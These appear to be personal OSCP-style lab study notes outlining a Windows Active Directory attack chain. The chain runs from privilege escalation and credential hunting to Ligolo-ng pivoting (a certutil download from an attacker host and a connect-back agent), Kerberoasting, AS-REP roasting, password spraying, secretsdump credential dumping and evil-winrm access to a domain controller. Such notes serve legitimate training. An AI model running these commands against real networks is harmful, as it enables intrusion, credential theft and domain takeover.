
gobuser dir -u /http://host.com -w /usr/share/..../common.txt tee enu/gobuster port80.log

exiftool  binaryfile.exe     - check wha kind of binary it is


on windows AD:
  whoami
  whoami /priv 
  net user
  net localgroup administrators

can use:
   -WinPEASx64.exe
        usuallyit is better to escalate to LocalSystem - priviliges - to become local admin
        
        (if loged on usr with domain\user it is nice - you can escalate on this one)
 
    SEARCH IN WINDOWS:
    - after become local admin make Active Directory enumeration:
        tree /?
        tree /f /a
        dir /s/b *.log    <-- if we find log like log  history.log 
        dir /s/b *.txt    <-- if we find log like log  history.txt with creds in commands


    LIGOLO
    - if you get any creds now  check AD , use Ligol-ng
      github.com/nicoch30/ligolo-ng/releases
            a) agent.exe on windows                                   <-- download using cerutil.exe -ulcache -f http://172.16.11.11/agent.exe
                              run: C:\Users\Public> agent.exe -connect 172.16.11:11601 -retry -igonre -cert     <-- after run proxy 
            b) ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz on linux  (proxy binary inside)
                                kali@kali~ proxy -selfcert
                            after connect:
                                ligoolo-ng >> session 
                                ligoolo-ng >> start 

            c) add route
                  sudo ip route add 10.10.1.0/24 dev ligolo
             
            
Try in scenario:            


1)  get acces to windows machine 
2)  ascalate to  local admin - LocalSystem  
3)  get any creads and info on machine
       a) dir /s/b *.log    <-- if we find log like log  history.log 
       b) dir /s/b *.txt    <-- if we find log like log  history.txt with creds in commands


4)  use logolo-ng to enumerateo the rest of AD
5)  nmap on all machines DC , and machine 2
6)  check smb on machines
7)  try kerberostinag and as-rep roasting (impacket-GetUserSPNs  -request -dc-ip <IP> oscp.lab/wordldstyle,  impacket-GetNPUsers -reques dc-ip <ip> oscp.lab/wordstyle )
  a) kerberosting    (atack kerberos , service principal name)
     impacket-GetUserSPNs  -request -dc-ip < IP> oscp.lab/wordldstyle    
     getuserspns.py htb.local/asmith/p@ssword                  - default do not use IP only domain name , need to have some creds
     getuserspns.py htb.local/asmith/p@ssword -request         - get hash
  b) as-rep roasting  ()
     impacket-GetNPUsers -request dc-ip <IP> oscp.lab/wyldstyle
     impacket-GetNPUsers -format  hashcat -usersfile users.txt -dc-ip 10.10.10.161 htb/
     getnpusers.py scrm.local/ -dc-ip 192.168.0.79 -request              
    

8)  use hashcat for ases from point 7
9)  use crackmapexec:   crackmapexec smb 10.10.1.200  ;  crackmapexec smb 10.10.1.200 -u users -p passwords --contiuneu-on-success 
10) if have hashes try smbclient etc on users we have , 
11) try  passwrod spray :
      crackmapexec smb  10.10.1.200-10.10.1.102 -u users - passwords -d oscp.lab --continu-on-success

12) if succes on password spray use impacket-psexec 
        impacket-psexec  oscp/emme/10.10.1.202        # domain is oscp.lab
         Password: 
         C:\Windows\..\>

    or:
        cadaver 192.168.227.122                                                 
        Authentication required for 192.168.227.122 on server `192.168.227.122':

13) check user adn domain users (mybe you are domain user)

         C:\Windows\..\> net user                     <-- user on machine
         C:\Windows\..\> net user  /domain            <-- check domain users
         C:\Windows\..\> net user <UserName> /domain  <-- check user/users (may be domain admin)     
14) now if domain user you can use mikatz or impacket-secretdump (secret dump is remoe from kali - beter for me)
         kali@kali~ impacket-secretdump oscp/emmet@10.10.1.202

15) if have hash you can use evil winrm to get to domain controler (DC has avtive winrm)
    evil-winrm -i 10.10.1.200 -u lord_buisnes -p <password dumped from impcket secretdump>


16) get flags using 

         C:\Windows\..\> tree /f /a Administrator

17) now:   type proof.txt
           whoami             <-- ospc\SthmUser
           ipconfig
           hostname

